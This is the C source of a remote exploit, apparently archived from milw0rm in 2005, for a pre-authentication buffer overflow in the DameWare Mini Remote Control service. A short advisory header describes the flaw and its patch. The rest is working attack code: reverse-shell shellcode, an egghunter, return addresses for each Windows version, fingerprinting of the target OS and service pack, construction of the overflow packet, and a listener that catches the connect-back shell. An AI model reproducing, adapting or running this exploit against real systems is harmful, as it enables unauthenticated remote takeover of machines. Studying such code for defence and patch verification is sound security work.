/************************************************************************************************
*                            _                   ______
*                           (_)___  ____  ____  / ____/
*                          / / __ \/ __ \/ __ \/___ \
*                         / / /_/ / / / / /_/ /___/ /
*                      __/ / .___/_/ /_/\____/_____/
*                     /___/_/======================
*************************************************************************************************
*
*                                       DameWare Mini Remote Control Client Agent Service
*                                               Another Pre-Authentication Buffer Overflow
*                                                                By Jackson Pollocks No5
*                                                                         www.jpno5.com
*
*
*       Summary
*               +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
*               DameWare Mini Remote Control is "A lightweight remote control intended primarily
*               for administrators and help desks for quick and easy deployment without
*               external dependencies and machine reboot.
*
*               Developed specifically for the 32-bit Windows environment (Windows 95/98/Me/NT/2000/XP),
*               DameWare Mini Remote Control is capable of using the Windows challenge/response authentication
*               and is able to be run as both an application and a service.
*
*               Some additional features include View Only, Cursor control, Remote Clipboard, Performance Settings,
*               Inactivity control, TCP only, Service Installation and Ping."
*
*               A buffer overflow vulnerability can be exploited remotely by an unauthenticated attacker
*               who can access the DameWare Mini Remote Control Server.
*
*               By default (DameWare Remote Control Server) DWRCS listens on port 6129 TCP.
*               An attacker can construct a specialy crafted packet and exploit this vulnerability.
*               The vulnerability is caused by insecure calls to the lstrcpyA function when checking the username.
*
*
*       Severity:   Critical
*
*       Impact:         Code Execution
*
*       Local:          Yes
*
*       Remote:         Yes
*
*       Patch:          Download version 4.9.0 or later and install over your existing installation.
*                               You can download the latest version of your DameWare Development Product at
*                               http://www.dameware.com/download
*
*       Details:        Affected versions will be any ver in above 4.0 and prior to 4.9
*                               of the Mini Remote Client Agent Service (dwrcs.exe).
*
*       Discovery:  i discovered this while using the dameware mini remote control client.
*                               i accidently pasted in a large string of text instead of my username.
*                               Clicking connect led to a remote crash of the application server.
*
*       Credits:        Can't really remember who's shellcode i used, more than likely it was
*                               written by Brett Moore.
*
*                               The egghunter was written by MMiller(skape). {Which kicks ass btw}
*
*                               Thanks to spoonm for tracking that NtAccessCheckAndAuditAlarm
*                               universal syscall down.
*
*                               Some creds to Adik as well, i did code my own exploit but it had none
*                               of that fancy shit like OS and SP detection. So basicly i just modded
*                               the payload from the old dameware exploit(ver 3.72).
*
*                               A little cred to me as well, after all i did put all them guys great
*                               work together to make something decent :)
*
************************************************************************************/

#include <stdio.h>
#include <string.h>
#include <winsock.h>

#pragma comment(lib,"ws2_32")

#define ACCEPT_TIMEOUT  25
#define RECVTIMEOUT             15

#define UNKNOWN         0
#define WIN2K           1
#define WINXP           2
#define WIN2K3          3
#define WINNT           4

               unsigned char rshell[] = {
       "\x41\x42\x41\x42\x41\x42\x41\x42\x90\x90\x90\x90\x90\x90\x90\x90"// For The Egghunter
       "\x90\xFC\x6A\xEB\x52\xE8\xF9\xFF\xFF\xFF\x60\x8B\x6C\x24\x24\x8B"// Reverse Shell
       "\x45\x3C\x8B\x7C\x05\x78\x01\xEF\x83\xC7\x01\x8B\x4F\x17\x8B\x5F"
       "\x1F\x01\xEB\xE3\x30\x49\x8B\x34\x8B\x01\xEE\x31\xC0\x99\xAC\x84"
       "\xC0\x74\x07\xC1\xCA\x0D\x01\xC2\xEB\xF4\x3B\x54\x24\x28\x75\xE3"
       "\x8B\x5F\x23\x01\xEB\x66\x8B\x0C\x4B\x8B\x5F\x1B\x01\xEB\x03\x2C"
       "\x8B\x89\x6C\x24\x1C\x61\xC3\x31\xC0\x64\x8B\x40\x30\x8B\x40\x0C"
       "\x8B\x70\x1C\xAD\x8B\x40\x08\x5E\x68\x8E\x4E\x0E\xEC\x50\xFF\xD6"
       "\x31\xDB\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32\x5F\x54\xFF\xD0"
       "\x68\xCB\xED\xFC\x3B\x50\xFF\xD6\x5F\x89\xE5\x66\x81\xED\x08\x02"
       "\x55\x6A\x02\xFF\xD0\x68\xD9\x09\xF5\xAD\x57\xFF\xD6\x53\x53\x53"
       "\x53\x43\x53\x43\x53\xFF\xD0\x68\x90\x90\x90\x90\x66\x68\x90\x90"
       "\x66\x53\x89\xE1\x95\x68\xEC\xF9\xAA\x60\x57\xFF\xD6\x6A\x10\x51"
       "\x55\xFF\xD0\x66\x6A\x64\x66\x68\x63\x6D\x6A\x50\x59\x29\xCC\x89"
       "\xE7\x6A\x44\x89\xE2\x31\xC0\xF3\xAA\x95\x89\xFD\xFE\x42\x2D\xFE"
       "\x42\x2C\x8D\x7A\x38\xAB\xAB\xAB\x68\x72\xFE\xB3\x16\xFF\x75\x28"
       "\xFF\xD6\x5B\x57\x52\x51\x51\x51\x6A\x01\x51\x51\x55\x51\xFF\xD0"
       "\x68\xAD\xD9\x05\xCE\x53\xFF\xD6\x6A\xFF\xFF\x37\xFF\xD0\x68\xE7"
       "\x79\xC6\x79\xFF\x75\x04\xFF\xD6\xFF\x77\xFC\xFF\xD0\x68\xEF\xCE"
       "\xE0\x60\x53\xFF\xD6\xFF\xD0"
       };

               unsigned char buff[40] = {
       "\x30\x11\x00\x00\x00\x00\x00\x00\xC3\xF5\x28\x5C\x8F\xC2\x0D\x40"// OS Detection
       "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
       "\x00\x00\x00\x00\x01\x00\x00\x00"
       };

               unsigned char fpay[] = {
       "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"// Egghunter
       "\xef\xb8\x41\x42\x41\x42\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
       "\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc"
};


long ip(char *hostname);
void shell (int sock);

int check(char *host,unsigned short tport, unsigned int *sp);

struct timeval tv;
fd_set fds;
char buff1[5000]="";

struct spl{
       unsigned long eip; char off[20];
};

struct{
       char type[10]; struct spl sp[7];
}

target_os[]={{  //Could proberly be doing with some better offsets
       "UNKNOWN"  ,{{ 0x00000000,"unknown.dll"  },{ 0x00000000,"unknown.dll" },{ 0x00000000,"unknown.dll" },{ 0x00000000,"unknown.dll"  },{ 0x00000000,"unknown.dll"  },{ 0x00000000,"unknown.dll" },{ 0x00000000,"unknown.dll"  }}},{
       "WIN 2000" ,{{ 0x750362c3,"ws2_32.dll"   },{ 0x75035173,"ws2_32.dll"  },{ 0x7C2FA0F7,"ws2_32.dll"  },{ 0x7C2FA0F7,"advapi32.dll" },{ 0x7C2FA0F7,"advapi32.dll" },{ 0x00000000,"unknown.dll" },{ 0x00000000,"unknown.dll"  }}},{
       "WIN XP"   ,{{ 0x71ab7bfb,"kernel32.dll" },{ 0x71ab7bfb,"ws2_32.dll"  },{ 0x7C941EED,"ws2_32.dll"  },{ 0x00000000,"unknown.dll"  },{ 0x00000000,"unknown.dll"  },{ 0x00000000,"unknown.dll" },{ 0x00000000,"unknown.dll"  }}},{
       "WIN 2003" ,{{ 0x77E216B8,"advapi32.dll" },{ 0x77FD1F89,"ntdll.dll"   },{ 0x77E216B8,"ntdll.dll"   },{ 0x77E216B8,"advapi32.dll" },{ 0x00000000,"unknown.dll"  },{ 0x00000000,"unknown.dll" },{ 0x00000000,"unknown.dll"  }}},{
       "WIN NT4"  ,{{ 0x77777777,"unknown.dll"  },{ 0x77777776,"unknown.dll" },{ 0x77777775,"unknown.dll" },{ 0x77f326c6,"kernel32.dll" },{ 0x77777773,"unknown.dll"  },{ 0x77777772,"unknown.dll" },{ 0x77f32836,"kernel32.dll" }}}
};

int main(int argc,char *argv[])
{
               WSADATA wsaData;
               struct sockaddr_in targetTCP, localTCP, inAccTCP;
               int sockTCP,s,localSockTCP,accSockTCP, acsz,switchon;

               unsigned char packet[24135]="";
               unsigned short lport, tport;
               unsigned long lip, tip;
               unsigned int ser_p=0;
               int ver=0;

       printf("\n\n        ====== D4m3w4r3 eXpLo1t, By jpno5 ======\n");
       printf("        ======    http://www.jpno5.com    ======\n\n");
       if(argc < 5){ printf("[+] %s Target_Ip Target_Port Return_Ip Return_Port\n\n",argv[0]);return 1;}

       WSAStartup(0x0202, &wsaData);

       tip=ip(argv[1]);
       tport = atoi(argv[2]);
       lip=inet_addr(argv[3])^(long)0x00000000;
       lport=htons(atoi(argv[4]))^(short)0x0000;

       memcpy(&rshell[184], &lip, 4);
       memcpy(&rshell[190], &lport, 2);

       memset(&targetTCP, 0, sizeof(targetTCP));memset(&localTCP, 0, sizeof(localTCP));

       targetTCP.sin_family = AF_INET;
       targetTCP.sin_addr.s_addr = tip;
       targetTCP.sin_port = htons(tport);

       localTCP.sin_family = AF_INET;
       localTCP.sin_addr.s_addr = INADDR_ANY;
       localTCP.sin_port = htons((unsigned short)atoi(argv[4]));

       if ((sockTCP = socket(AF_INET, SOCK_STREAM, 0)) == -1)     {
               printf("\t\t\t[ FAILED ]\n");
               WSACleanup();
               return 1;
       }
       if ((localSockTCP = socket(AF_INET, SOCK_STREAM, 0)) == -1){
               printf("\t\t\t[ FAILED ]\n");
               WSACleanup();
               return 1;
       }

       printf("[#] Listening For Shell On: %s...",argv[4]);

       if(bind(localSockTCP,(struct sockaddr *)&localTCP,sizeof(localTCP)) !=0){
               printf("\t\t\n Binding To Port: %s Failed! Make Sure It Aint In Use Arleady\n",argv[4]);
               WSACleanup();
               return 1;
       }

       if(listen(localSockTCP,1) != 0){
               printf("\t\t\t[ FAILED ]\nFailed to listen on port: %s!\n",argv[4]);
               WSACleanup();
               return 1;
       }

       ver = check(argv[1],(unsigned short)atoi(argv[2]),&ser_p);

       printf("\n[*] Target: %s SP: %d...",target_os[ver].type,ser_p);

       memcpy(packet,"\x10\x27",2);
       memcpy(packet+0xc4+9,rshell,strlen(rshell));
       *(unsigned long*)&packet[516] = target_os[ver].sp[ser_p].eip;
       memcpy(packet+520,fpay,strlen(fpay));

       if(connect(sockTCP,(struct sockaddr *)&targetTCP, sizeof(targetTCP)) != 0){
               printf("\n[x] Connection to host failed!\n");
               WSACleanup();
               exit(1);
       }

       switchon=1;
       ioctlsocket(sockTCP,FIONBIO,&switchon);
       tv.tv_sec = RECVTIMEOUT;
       tv.tv_usec = 0;FD_ZERO(&fds);
       FD_SET(sockTCP,&fds);

       if((select(1,&fds,0,0,&tv))>0){
               recv(sockTCP, buff1, sizeof(buff1),0);}else{
                       printf("[x] Timeout! Failed to recv packet.\n");
                       exit(1);
               }

       memset(buff1,0,sizeof(buff1));
       switchon=0;ioctlsocket(sockTCP,FIONBIO,&switchon);

       if (send(sockTCP, buff, sizeof(buff),0) == -1){
               printf("[x] Failed to inject packet!\n");
               WSACleanup();
               return 1;
       }

       switchon=1;
       ioctlsocket(sockTCP,FIONBIO,&switchon);
       tv.tv_sec = RECVTIMEOUT;tv.tv_usec = 0;
       FD_ZERO(&fds);FD_SET(sockTCP,&fds);

       if((select(sockTCP+1,&fds,0,0,&tv))>0){
               recv(sockTCP, buff1, sizeof(buff1),0);switchon=0;
       ioctlsocket(sockTCP,FIONBIO,&switchon);

       if (send(sockTCP, packet, sizeof(packet),0) == -1){
               printf("[x] Failed to inject packet! \n");
               WSACleanup();
               return 1;
       }
       }else{
               printf("\n[x] Timedout! Failed to receive packet!\n");
               WSACleanup();
               return 1;
       }

       closesocket(sockTCP);

       printf("\n[*] Waiting for Shell...\r");

       switchon=1;
       ioctlsocket(localSockTCP,FIONBIO,&switchon);
       tv.tv_sec = ACCEPT_TIMEOUT;
       tv.tv_usec = 0;FD_ZERO(&fds);
       FD_SET(localSockTCP,&fds);

       if((select(1,&fds,0,0,&tv))>0){
               acsz = sizeof(inAccTCP);
               accSockTCP = accept(localSockTCP,(struct sockaddr *)&inAccTCP, &acsz);
               printf("\n[*] Enjoy...\n\n");
               shell(accSockTCP);
       }else{
               printf("\n[x] Exploit Failed! Proberly Patched\n");
               WSACleanup();
       }
       return 0;
}

long ip(char *hostname) {
       struct hostent *he;
       long ipaddr;

       if ((ipaddr = inet_addr(hostname)) < 0) {
       if ((he = gethostbyname(hostname)) == NULL) {
               printf("[x] Failed to resolve host: %s!\n\n",hostname);
               WSACleanup();exit(1);
       }

       memcpy(&ipaddr, he->h_addr, he->h_length);}return ipaddr;}

 void shell (int sock){
 struct timeval tv;int length;
 unsigned long o[2];
 char buffer[1000];

 tv.tv_sec = 1;tv.tv_usec = 0;
 while (1){ o[0] = 1;o[1] = sock;
       length = select (0, (fd_set *)&o, NULL, NULL, &tv);
       if(length == 1){length = recv (sock, buffer, sizeof (buffer), 0);
       if (length <= 0) {
               printf ("[x] Connection closed.\n");
               WSACleanup();
               return;
       }
       length = write (1, buffer, length);
       if (length <= 0) {
               printf ("[x] Connection closed.\n");
               WSACleanup();return;}}else{length = read (0, buffer, sizeof (buffer));
       if (length <= 0) {
               printf ("[x] Connection closed.\n");
               WSACleanup();return;}length = send(sock, buffer, length, 0);
       if (length <= 0) {
               printf ("[x] Connection closed.\n");
               WSACleanup();
               return;
               }}}}

int check(char *host,unsigned short tport, unsigned int *sp){

       int sockTCP,switchon;
       struct sockaddr_in targetTCP;
       struct timeval tv;fd_set fds;

       memset(&targetTCP,0,sizeof(targetTCP));
       targetTCP.sin_family = AF_INET;targetTCP.sin_addr.s_addr = inet_addr(host);targetTCP.sin_port = htons(tport);

       if ((sockTCP = socket(AF_INET, SOCK_STREAM, 0)) == -1){
               printf("\t\t\t[ FAILED ]\n Socket not initialized! Exiting...\n");
               WSACleanup();
               return 1;
       }

       if(connect(sockTCP,(struct sockaddr *)&targetTCP, sizeof(targetTCP)) != 0){
               printf("[x] Connection to host failed!\n");
               WSACleanup();
               exit(1);
       }

       switchon=1;
       ioctlsocket(sockTCP,FIONBIO,&switchon);
       tv.tv_sec = RECVTIMEOUT;
       tv.tv_usec = 0;
       FD_ZERO(&fds);FD_SET(sockTCP,&fds);

       if((select(1,&fds,0,0,&tv))>0){
               recv(sockTCP, buff1, sizeof(buff1),0);}
       else{
               printf("[x]Timedout! Doesn't Look Like A Dameware Server\n");
               exit(1);
       }

       switchon=0;
       ioctlsocket(sockTCP,FIONBIO,&switchon);

       if (send(sockTCP, buff, sizeof(buff),0) == -1){
               printf("[x] Failed\n");
               WSACleanup();
               return 1;
       }

       switchon=1;
       ioctlsocket(sockTCP,FIONBIO,&switchon);

       tv.tv_sec = RECVTIMEOUT;
       tv.tv_usec = 0;FD_ZERO(&fds);
       FD_SET(sockTCP,&fds);

       if((select(sockTCP+1,&fds,0,0,&tv))>0){
               recv(sockTCP, buff1, sizeof(buff1),0);
               closesocket(sockTCP);
       } else {
               printf("\n[x] Timedout!\n");
               WSACleanup();
               return 1;
       }

       if(buff1[8]==5 && buff1[12]==0){*sp = atoi(&buff1[37]);
       closesocket(sockTCP);
       return WIN2K;
       }  else if(buff1[8]==5 && buff1[12]==1){*sp = atoi(&buff1[37]);
       closesocket(sockTCP);
       return WINXP;
       }  else if(buff1[8]==5 && buff1[12]==2){*sp = atoi(&buff1[37]);
       closesocket(sockTCP);
       return WIN2K3;
       } else if(buff1[8]==4){*sp = atoi(&buff1[37]);
       closesocket(sockTCP);
       return WINNT;
       } else{
               closesocket(sockTCP);
       return UNKNOWN;
       }
}

// milw0rm.com [2005-08-31]